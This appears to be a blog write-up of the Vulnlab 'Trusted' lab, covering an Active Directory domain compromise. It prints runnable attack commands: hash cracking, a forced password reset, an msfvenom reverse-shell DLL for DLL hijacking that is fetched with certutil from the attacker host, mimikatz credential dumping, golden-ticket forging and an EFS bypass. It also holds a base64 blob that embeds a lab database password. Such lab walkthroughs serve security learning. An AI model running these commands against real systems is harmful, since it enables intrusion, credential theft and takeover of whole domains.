<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=&quot; | base64 -d</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;[...snip...]&quot;;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($servername, $username, $password);</span><br><span class="line"></span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">  die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Connected successfully&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="MySQL-Enumeration"><a href="#MySQL-Enumeration" class="headerlink" title="MySQL Enumeration"></a>MySQL Enumeration</h1><p>If you remember from earlier, our NMAP scan told us earlier that the <code>MySQL</code> service was public facing. We can attempt to authenticate to it using the credentials we have to see what else we may have access to.<br><code>mysql -h 10.10.162.38 -u &#39;root&#39; -p</code></p>
<p>This gives us access to the <code>MariaDB</code> database, to which we can look around for any credentials to the Active Directory instance.<br>Upon some enumerating, I found some credentials in the <code>news</code> database.<br><code>select * from users;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br><span class="line">| id | first_name | short_handle | last_name | password                         |</span><br><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br><span class="line">|  1 | Robert     | rsmith       | Smith     | [...snip...]                     |</span><br><span class="line">|  2 | Eric       | ewalters     | Walters   | [...snip...]                     |</span><br><span class="line">|  3 | Christine  | cpowers      | Powers    | [...snip...]                     |</span><br><span class="line">+----+------------+--------------+-----------+----------------------------------+</span><br></pre></td></tr></table></figure>

<p>Originally I had thought that these hashes were LM hashes, however upon testing them with <code>crackmapexec</code> and <code>hashcat auto-detect mode</code>, it seems that they may very well be another hashing algorithm. After a bit of testing with <code>jtr</code> it seems that this specific hashing algorithm is <code>Raw-MD5</code><br><code>john rsmith.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])</span><br><span class="line">Warning: no OpenMP support for this hash type, consider --fork=4</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">[...snip...]       (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2024-05-02 01:41) 1.666g/s 18487Kp/s 18487Kc/s 18487KC/s IHav.One*Q..IHATESPIDERS</span><br><span class="line">Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>

<p>This gives us the plaintext of <code>rsmith</code>‘s password, which we can use to do dump a lot of other things around this specific domain controller.</p>
<p>Testing the creds to these with CrackMapExec, we can see that these specific creds are valid to LDAP.<br><code>crackmapexec ldap 10.10.157.166 -u &#39;rsmith&#39; -p &#39;[...snip...]&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SMB         10.10.157.166   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        10.10.157.166   389    LABDC            [+] lab.trusted.vl\rsmith:[...snip...]</span><br></pre></td></tr></table></figure>

<p>Now that we have verified that <code>rsmith</code>‘s creds are eligible to authenticate to LDAP, we can now use these same credentials to dump LDAP and identify all other domain objects.</p>
<h1 id="Dumping-LDAP"><a href="#Dumping-LDAP" class="headerlink" title="Dumping LDAP"></a>Dumping LDAP</h1><p>Normally you’d be able to use <code>ldapdomaindump</code>, however I’m more used to using the Bloodhound-Python ingestor. I’ve also found that <code>ldapdomaindump</code> still does not work after remediating an error that you’ll see pretty soon with the Python ingestor. Nonetheless I’d still like to include what the <code>ldapdomaindump</code> command would look like in this context.<br> <code>ldapdomaindump -u LABDC\\&#39;rsmith&#39; -p &#39;[...snip...]&#39; ldap://10.10.157.166:389</code><br><code>BloodHound.py/bloodhound.py -d &#39;trusted.vl&#39; -u &#39;rsmith&#39; -p [...snip...] -c all -ns 10.10.157.166 --zip</code><br><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">https://github.com/dirkjanm/BloodHound.py</a></p>
<p>It seems I’ve encountered an issue that I’ve never come into contact before. Upon running this command, you’ll find that a nameserver error occurs based on an invalid query.<br><code>dns.resolver.NoNameservers: All nameservers failed to answer the query _ldap._tcp.pdc._msdcs.trusted.vl. IN SRV: Server Do53:10.10.157.166@53 answered SERVFAIL</code></p>
<p>I couldn’t find why this issue occurs, however my guess is that the domain <code>trusted.vl</code> is either rerouting or denying all DNS nameserver replies that come into contact with the domain.<br>We can circumvent this issue by using <code>dnschef</code>,  a DNS proxy that will allow us to bind all DNS requests back to localhost instead of making a direct request to the DNS server.</p>
<p>Note that you’ll need two terminals to do this, one for initializing the DNS proxy and another for actually utilizing the ingestor.<br><code>dnschef --fakeip 10.10.157.166</code><br><code>BloodHound.py/bloodhound.py -d &#39;lab.trusted.vl&#39; -u &#39;rsmith&#39; -p &#39;[...snip...]&#39; -c all -ns 127.0.0.1 --zip -dc labdc.lab.trusted.vl</code></p>
<p>This is a potential workaround when coming into contact with DNS nameserver resolution errors when coming into contact with errors using the ingestor. While this may not work every time, it is still a method to give a shot.</p>
<p>After receiving the compressed domain dump file, we can import it to Bloodhound and begin enumerating what <code>rsmith</code> can do.</p>
<p>In case you are unfamiliar with how to set up Bloodhound, here’s a beginner walkthrough to do before the next step in this walkthrough. <a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a></p>
<p>After uploading the zip folder to Bloodhound, let’s search up the domain object for <code>rsmith@lab.trusted.vl</code>. After selecting <code>Node Info</code>, we can see that <code>rsmith</code> has an1 outbound object control.</p>
<p><img src="/images/vulnlab/trusted-vl/g.jpg"></p>
<p>It seems that <code>rsmith</code> has <code>ForceChangePassword</code> rights onto <code>ewalters</code>, one of the other users that we dumped in our enumeration of the SQL instance previously. This outbound object control means exactly what you think it might mean - <code>rsmith</code> has the ability to force a password reset on <code>ewalters</code>, meaning we can do exactly that.</p>
<h1 id="ForceChangePassword-Object-Control"><a href="#ForceChangePassword-Object-Control" class="headerlink" title="ForceChangePassword Object Control"></a>ForceChangePassword Object Control</h1><p>To reset a user’s password with this outbound object control, you can use tools such as <code>rpcclient</code> or <code>bloodyad</code>. I’m more used to using <code>bloodyad</code> so that’s what we’ll use in our situation. <code>bloodyAD/bloodyAD.py -u &#39;rsmith&#39; -p &#39;[...snip...]&#39; -d &#39;lab.trusted.vl&#39; --host 10.10.157.166 set password &#39;ewalters&#39; &#39;password123@&#39;</code></p>
<p>I changed <code>ewalters</code> password to something simple, however you can make it whatever you’d like. If successful, you’ll receive a small <code>[+] Password has changed successfully!</code> message. This indicates that the password for <code>ewalters</code> has been changed amongst the entire domain.</p>
<p>We can now verify that the changes have been made with CrackMapExec. I’ve decided to use a one-liner with all of the CME services separated by a newline in a text file.<br><code>for line in $(cat cme_services.txt); do crackmapexec $line 10.10.157.166 -u &#39;ewalters&#39; -p &#39;password123@&#39;; done</code></p>
<p>You’ll notice that while RDP is valid (despite Bloodhound telling us that this user has RDP privileges, we can authenticate to WinRM.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SMB         10.10.157.166   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)</span><br><span class="line">HTTP        10.10.157.166   5985   LABDC            [*] http://10.10.157.166:5985/wsman</span><br><span class="line">WINRM       10.10.157.166   5985   LABDC            [+] lab.trusted.vl\ewalters:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>So from here we’ll use <code>evil-winrm</code> to authenticate through WinRM with the <code>ewalters</code> user.</p>
<p><code>evil-winrm --ip 10.10.157.166 -u &#39;ewalters&#39; -p &#39;password123@&#39;</code></p>
<p><img src="/images/vulnlab/trusted-vl/h.jpg"></p>
<h1 id="DC1-Host-Reconnaissance"><a href="#DC1-Host-Reconnaissance" class="headerlink" title="DC1 Host Reconnaissance"></a>DC1 Host Reconnaissance</h1><p>While normally we’d get the user flag at this point, <code>r0BIT</code> messed around with us and left a fake flag in <code>ewalters</code> Desktop directory.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ewalters\Documents&gt; cd ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\ewalters\Desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\ewalters\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website</span><br><span class="line">-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website</span><br><span class="line">-a----         9/18/2022   9:12 PM         202492 robitcat.jpg</span><br><span class="line">-a----         9/18/2022   9:11 PM            108 User.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c*Evil-WinRM* PS C:\Users\ewalters\Desktop&gt; cat User.txt</span><br><span class="line">|\---/|</span><br><span class="line">| o_o |</span><br><span class="line"> \_^_/</span><br><span class="line">These are not the flags you&#x27;re looking for.</span><br><span class="line">Take :robitcat: as compensation :).</span><br></pre></td></tr></table></figure>

<p>It looks like we’ll need to look around a little more and escalate to another user to get the user flag. My guess is that we’ll need to get to <code>cpowers</code>, who was the third and final user that we were able dumped from the SQL database.</p>
<p>While I was looking around the filesystem for any leads, I stumbled across a folder in the <code>C:\</code> directory titled, <code>AVTest</code>. This isn’t a folder that’s here regularly so let’s take a look into it a little more.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\AVTest&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\AVTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         9/14/2022   4:46 PM        4870584 KasperskyRemovalTool.exe</span><br><span class="line">-a----         9/14/2022   7:05 PM            235 readme.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\AVTest&gt; cat readme.txt</span><br><span class="line">Since none of the AV Tools we tried here in the lab satisfied our needs it&#x27;s time to clean them up.</span><br><span class="line">I asked Christine to run them a few times, just to be sure.</span><br><span class="line"></span><br><span class="line">Let&#x27;s just hope we don&#x27;t have to set this lab up again because of this.</span><br></pre></td></tr></table></figure>

<p>The <code>readme.txt</code> tells us that the AV tools are being disposed of, however it seems that the <code>cpowers</code> user will be running this executable a few more times before the dispose is initiated.</p>
<p>In a regular red-teaming context, we need to ensure that we move hastily upon seeing this. We may not know the timeframe when the <code>cpowers</code> user is going to execute values.<br>At the same time, this is a pen-testing lab, so I’m going to assume that there’s a scheduled task running every now and then that will execute the file - just my logical thinking though.</p>
<p>Not only that, but if we take a look at <code>cpowers</code> in Bloodhound, we can see that they’re part of the Domain Admins group for this domain.</p>
<p><img src="/images/vulnlab/trusted-vl/i.jpg"></p>
<p>This means that if we compromise <code>cpowers</code>, we’ll have full control over this domain controller.</p>
<p>Let’s examine this file to see if there’s anything we can do to escalate our privileges when <code>cpowers</code> runs it. Normally I’d just transfer it using a C2 or by using a simple Python server on the Windows machine, however it seems I was unable to find success when trying either of them. Instead we can stand up our own SMB server using Impacket’s <code>smbserver</code> utility.</p>
<p>Kali - <code>impacket-smbserver smb share/ -smb2support</code><br>WinRM - <code>copy KasperskyRemovalTool.exe \\10.8.0.173\smb\KasperskyRemovalTool.exe</code></p>
<p>This should download the AV tool into our <code>share/</code> directory (that we might need to create locally before setting up the SMB server).</p>
<p>So this next part was where I got confused, as examining this with tools such as Ghidra didn’t result in many finds. Usually when it comes to reverse engineering PE32 binaries, you’d want to look specifically at abnormal classes or functions or even DLLs that the binary uses that could be exploited. The only issue is that all of these binary functions for this file seem to be relatively normal or at least don’t seem to be noteworthy enough to look into.</p>
<p>Looking into CVE’s didn’t seem to get me anywhere either, but it started to get a few gears working as to what we could potentially do. <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/10484">https://www.exploit-db.com/exploits/10484</a><br>While we know that the starting functions don’t seem to be very important, what about the DLLs that are loaded while the file is running? Could these potentially be exploited?</p>
<p>I decided to use ProcMon for this, as we can look specifically at the DLLs that are being ran after we execute the file and while it is running.<br>Note that I was running my machine through a Kali Linux VM, so I’ll need to transfer it to my local Windows 10 host in order to examine it with ProcMon.</p>
<h1 id="ProcMon-Executable-Reverse-Engineering"><a href="#ProcMon-Executable-Reverse-Engineering" class="headerlink" title="ProcMon Executable Reverse Engineering"></a>ProcMon Executable Reverse Engineering</h1><p>There are alternatives to setting up ProcMon for Linux, however I was unable to get it working when I had tried it out initially. I’ll still leave the link for it as provided here: <a target="_blank" rel="noopener" href="https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file">https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file</a></p>
<p><img src="/images/vulnlab/trusted-vl/j.jpg"></p>
<p>Before we run the file, we should make sure that we have the right filters set up since we’ll get barraged with internal functions and files that the binary will use during runtime. Go to <code>Filter &gt; Filter</code> (or just press <code>Ctrl + l</code></p>
<p>On this screen, we can create filters to view only a section of processes and&#x2F;or functions that interest us.</p>
<p><img src="/images/vulnlab/trusted-vl/k.jpg"></p>
<p>For simplicities sake, I’ve outlined the filter parameters that we’ll need to detect the processes of interest.</p>
<p><code>Process Name - contains - Kaspersky -&gt; then Include</code><br><code>Path - ends with - .dll -&gt; then Include</code></p>
<p>Running the file with these two filters still leaves us with a barrage of information, however you’ll notice that many of the DLLs have a <code>Result</code> value of <code>NAME NOT FOUND</code>. This is particularly interesting, as the <code>File Path</code> for the DLL is within the same directory of the binary that was executed.</p>
<p>We’ll also put down these results as another filter to see specifically what DLLs these results entail.</p>
<p><code>Result - is - NAME NOT FOUND -&gt; then Include</code></p>
<p><img src="/images/vulnlab/trusted-vl/l.jpg"></p>
<p>There are a numerous amount of DLLs that are executed within the same directory as the binary (my binary is located in <code>Downloads\kas\</code>). This presents us with a vulnerability that is also new for my research - DLL Hijacking.</p>
<h1 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h1><p>DLL Hijacking is a Windows application vulnerability that essentially allows an attacker to load malicious DLLs into a process in place of regular DLLs. This can occur in the situation in front of us - when a binary uses DLLs that are located within a modifiable directory that we have access to. By replacing a normal DLL that is used, we can trick the Windows API into running our malicious DLL.</p>
<p>I plan on making a research post about DLL Hijacking in the future, however in the meantime I’ve referenced a HackTricks post that illustrates it relatively well.<br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a></p>
<p>So in that case let’s give it a try. We’ll start by creating a malicious DLL with <code>msfvenom</code>, which can be done using the following command. I initially tried this with replacing <code>USP10.dll</code>, however I found that it wouldn’t spawn a reverse shell as intended. Instead, we’ll use the <code>KasperskyRemovalToolENU.dll</code> that is called multiple times during runtime.<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f dll &gt; KasperskyRemovalToolENU.dll</code></p>
<p>We’ll then set up a Python web server with <code>python3 -m http.server 9002</code> to transfer the file.<br>Also, we’ll set up a netcat reverse shell so that when <code>cpowers</code> executes the Kaspersky tool binary, we’ll get a callback after our malicious DLL is ran.</p>
<p>On Kali - <code>nc -lvnp 9001</code><br>On WinRM - <code>certutil.exe -urlcache -f http://10.8.0.173:9002/KasperskyRemovalToolENU.dll KasperskyRemovalToolENU.dll</code></p>
<p>After a few seconds of waiting, our netcat listener should spawn a reverse shell as <code>cpowers</code>.</p>
<p><img src="/images/vulnlab/trusted-vl/m.jpg"></p>
<p>Since we are now a DA, we can read the user flag that is present in the <code>Administrator</code> directory.</p>
<p><code>PS C:\Windows\system32&gt; cd C:\Users\Administrator\Desktop; cat User.txt</code></p>
<p>From here, I stood up a Sliver C2 server to try and enumerate the other domain a little easier.</p>
<p>Note that we couldn’t do this previously as <code>ewalters</code>, as there was a GPO that restricted us from doing so.<br>If you’re unaware on how to set up a Sliver C2 server, I’ll reference the material needed to do so here: <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a><br><code>sliver &gt; mtls</code><br><code>generate beacon --mtls 10.8.0.173 --os windows --format exe --arch amd64 --skip-symbols --save (directory of your choice)</code></p>
<p>After transferring the file and running it on our reverse shell, we should see a session spawn on Sliver.</p>
<p><img src="/images/vulnlab/trusted-vl/n.jpg"></p>
<p>So to start, my first guess is that there’s some form of domain trust amongst both domain controllers. I had said this earlier in the machine, just based off the chain’s name <code>Trusted</code>. There’s two (technically three) methods that I know of to enumerate a domain, consisting across all of the shells we have access to.</p>
<h1 id="Domain-Trust-Enumeration"><a href="#Domain-Trust-Enumeration" class="headerlink" title="Domain Trust Enumeration"></a>Domain Trust Enumeration</h1><p>We can enumerate the domain locally with <code>Get-ADTrust</code>, a regular PowerShell module that is present on this machine.<br><code>Get-ADTrust -Filter *</code></p>
<p>Another is to drop <code>PowerView</code> to the machine and then import it.<br><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a><br><code>Import-Module .\PowerView.ps1; Get-DomainTrust</code></p>
<p>Finally, we can also use <code>sharpview</code>, a .NET version of <code>PowerView</code> that is present in Sliver’s <code>armory</code> function.<br><code>sliver &gt; armory install sharpview</code><br><code>sliver &gt; sharpview Get-Domain</code><br>The only issue with <code>sharpview</code> is that I was running into an LDAP issue (when running <code>Get-DomainTrust</code>, so I’ll just use the local <code>PowerView</code> option we discussed about previously.</p>
<p>After running <code>Get-DomainTrust</code> or <code>Get-ADTrust</code>, we receive the following output.</p>
<p><img src="/images/vulnlab/trusted-vl/o.jpg"></p>
<p>This means that there is a <code>Bidirectional</code> domain trust between both the child domain <code>lab.trusted.vl</code> and the parent domain <code>trusted.vl</code>. What this essentially means is that both domains <code>lab.trusted.vl</code> and <code>trusted.vl</code> trust one another - meaning that if you are a Domain Admin in one of the domains, you can also create a TGT for a Domain Admin in the other.</p>
<p>I’d like to create a blog post about this in the future, as the term for this is called <code>Domain Dominance</code> and is relatively interesting how you can compromise domains through domain trusts. You can also verify this in <code>Bloodhound</code> by looking at the <code>Map Domain Trusts</code> in the <code>Analysis</code> tab.</p>
<p><img src="/images/vulnlab/trusted-vl/p.jpg"></p>
<p>This also means that we can create a Golden ticket through Kerberos that can be used across both domains. For context, a Golden ticket is a forged TGT, which is signed by the respective domain’s <code>krbtgt</code> service account. This ticket can be used to impersonate any user, on any service, to every machine on the domain (or within the domain trust!). What also makes this incredibly powerful is that the credentials are never changed automatically. This means that if you have the <code>krbtgt</code> AES or NTLM hash, you can essentially perform almost any domain attack that you’d like (such as <code>dcsync</code> as an example).</p>
<p>In order to exploit the domain trust, we’ll need three different things: </p>
<ul>
<li>The <code>NTLM</code> of the <code>krbtgt</code> domain object.</li>
<li>The <code>LAB</code> domain object SID.</li>
<li>The <code>TRUSTED</code> domain object SID for the <code>Enterprise Admins</code> group.</li>
</ul>
<p>In order to get all three of those, we can use <code>mimikatz</code> to dump all of this information. Generally we’d want to try and get <code>mimikatz</code> past AV by utilizing a C2 or by process injection, however we won’t need to do this since Defender is not enabled for this chain.</p>
<h1 id="Golden-Ticket-to-DC2"><a href="#Golden-Ticket-to-DC2" class="headerlink" title="Golden Ticket to DC2"></a>Golden Ticket to DC2</h1><p>Thus, we can just drop <code>mimikatz</code> to disk and run it through the DC. <a target="_blank" rel="noopener" href="https://github.com/ParrotSec/mimikatz">https://github.com/ParrotSec/mimikatz</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sliver &gt; upload mimikatz.exe</span><br><span class="line"></span><br><span class="line">C:\Users\cpowers\Documents&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>This gives us the <code>krbtgt</code> NTLM hash as well as the <code>LAB</code> domain SID.<br>In order to get the domain SID of the <code>TRUSTED</code> domain, we can use a built-in PowerShell cmdlet call <code>Get-ADGroup</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\cpowers\Documents&gt; Get-ADGroup -Filter &#123;name -eq &quot;Enterprise Admins&quot;&#125; -Server trusted.vl</span><br></pre></td></tr></table></figure>

<p>Try not to do this through <code>Evil-WinRM</code>, I ran into some domain resolution issues and instead found better luck by running it through a reverse shell.<br>We now have the following information in order to build our Golden ticket.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NTLM Hash     - [...snip...]</span><br><span class="line">LAB SID       - S-1-5-21-2241985869-2159962460-1278545866</span><br><span class="line">TRUSTED SID   - S-1-5-21-3576695518-347000760-3731839591-519</span><br><span class="line">Target Domain - trusted.vl</span><br><span class="line"></span><br><span class="line">&gt; impacket-ticketer -nthash [...snip...] -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator</span><br></pre></td></tr></table></figure>

<p>This saves our Golden ticket as a new file called <code>Administrator.ccache</code>. We’ll need to set this as a global variable on our Kali machine to use this to authenticate with Kerberos on the parent domain.</p>
<p>Once all of this is completed, we can use <code>psexec</code> to spawn a shell in this domain as the <code>Administrator</code> user. Reminder to use the <code>FQDN</code> (Fully Qualified Domain Name) of the parent domain controller, which is <code>trusteddc.trusted.vl</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">&gt; impacket-psexec lab.trusted.vl/Administrator@trusteddc.trusted.vl -k -no-pass -target-ip 10.10.197.213</span><br></pre></td></tr></table></figure>

<p>This will open up a remote shell through <code>PsExec</code> on the <code>TRUSTEDDC</code> domain controller a <code>SYSTEM</code>, meaning we have completed this chain! Is what I hoped.</p>
<p><img src="/images/vulnlab/trusted-vl/q.jpg"></p>
<p>You’ll notice that if you try to read the <code>root.txt</code>, we don’t have the permissions to read it. Which if we think about it, doesn’t make sense right? We’re <code>SYSTEM</code> yet we don’t have permissions to read the file.</p>
<p>My guess is that there are privileges that restricting us from accessing this file, meaning we need to use . To save some time (in the screenshot above as you’ll notice), I used <code>mimikatz</code> to dump the Administrator hash and log-in with it through WinRM, however this STILL did not let us access the file.</p>
<p><code>C:\Users\Administrator\Desktop&gt; .\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:Administrator /patch&quot; &quot;exit&quot; </code>evil-winrm –ip 10.10.197.213 -u ‘Administrator’ -H ‘[…snip…]’&#96; (with Administrator NTLM hash)</p>
<p>If you run <code>cipher /u /n</code> on the machine, you’ll notice that the <code>root</code> flag is encrypted with <code>EFS</code>.</p>
<p><img src="/images/vulnlab/trusted-vl/r.jpg"></p>
<h1 id="EFS-Bypass-as-SYSTEM"><a href="#EFS-Bypass-as-SYSTEM" class="headerlink" title="EFS Bypass as SYSTEM"></a>EFS Bypass as SYSTEM</h1><p>EFS (Encrypted File System) is a built-in Windows encryption feature that allows you to encrypt files or directories to prevent other users from opening them. This produces a certificate, which is required to be present in your current session in order to decrypt the encrypted file and read it.</p>
<p>I also plan on creating a blog post based on <code>EFS</code> file decryption, as there’s other bypasses aside from the one you’ll see in a few moments.</p>
<p>To bypass this, we can use <code>runasCs</code> to circumvent the <code>EFS</code> encryption and read the flag as we  would normally.<br>We’ll also need to change the <code>Administrator</code>‘s user password in order to use <code>runasCs</code>, which is really simple now that we have access to command-line session as this user.</p>
<p><code>net user administrator &quot;password123@&quot;</code><br><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">https://github.com/antonioCoco/RunasCs</a></p>
<p>Note that you can just use the PowerShell module that comes in this GitHub package, and just import it. Make sure to also upload this in a directory other than the <code>Administrator</code> directory, as this entire directory under the <code>EFS</code> encryption rule.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sliver &gt; upload RunasCs/Invoke-RunasCs.ps1</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Public\Desktop&gt; Import-Module .\Invoke-RunasCs.ps1; Invoke-RunasCs administrator &quot;password123@&quot; &quot;cmd.exe /c type C:\users\administrator\desktop\root.txt&quot;</span><br></pre></td></tr></table></figure>

<p>This will open the file and allow us to read the contents of the <code>root</code> flag. Thus, we have completed this chain!</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Big thanks to <code>r0BIT</code> for creating this chain, as it was extremely helpful in understanding Domain Dominance and EFS encryption. Helped a lot to help myself understand these topics and how to perform them mainly through Kali (and with some help through Mimikatz).</p>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">https://github.com/dirkjanm/BloodHound.py</a><br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/10484">https://www.exploit-db.com/exploits/10484</a><br><a target="_blank" rel="noopener" href="https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file">https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file</a><br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a><br><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a><br><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a><br><a target="_blank" rel="noopener" href="https://github.com/ParrotSec/mimikatz">https://github.com/ParrotSec/mimikatz</a><br><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">https://github.com/antonioCoco/RunasCs</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://dan-feliciano.com">Youssef Achtatal</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://dan-feliciano.com/2024/06/05/trusted/">http://dan-feliciano.com/2024/06/05/trusted/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnlab/">vulnlab</a><a class="post-meta__tags" href="/tags/CHAIN/">CHAIN</a><a class="post-meta__tags" href="/tags/Easy/">Easy</a></div><div class="post_share"><div class="social-share" data-image="/images/vulnlab/trusted-vl/trusted_slide.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/06/05/domain-trusts/" title="Domain &amp; Forest Trusts"><img class="cover" src="/images/research/domain-trusts/domain_trusts.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Domain &amp; Forest Trusts</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div 